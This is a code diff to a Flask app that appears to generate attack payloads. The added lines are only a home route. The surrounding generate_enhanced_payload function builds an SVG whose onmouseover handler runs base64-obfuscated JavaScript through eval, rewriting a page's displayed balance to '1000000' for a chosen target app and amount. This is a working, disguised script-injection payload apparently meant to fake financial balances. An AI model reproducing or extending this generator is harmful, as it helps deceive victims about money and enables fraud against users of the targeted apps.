@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, render_template
 from flask_sqlalchemy import SQLAlchemy
 import uuid
 import os
@@ -56,6 +56,10 @@ def generate_enhanced_payload(device_id, target_app, target_amount):
         <rect x="0" y="0" width="1" height="1" 
               onmouseover="eval(atob('ZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmJhbGFuY2UnKS5pbm5lckhUTUw9JzEwMDAwMDAn'))"/>
     </svg>"""
+
+@app.route('/')
+def home():
+    return render_template('index.html')
 
 @app.route('/generate', methods=['POST'])
 def generate():
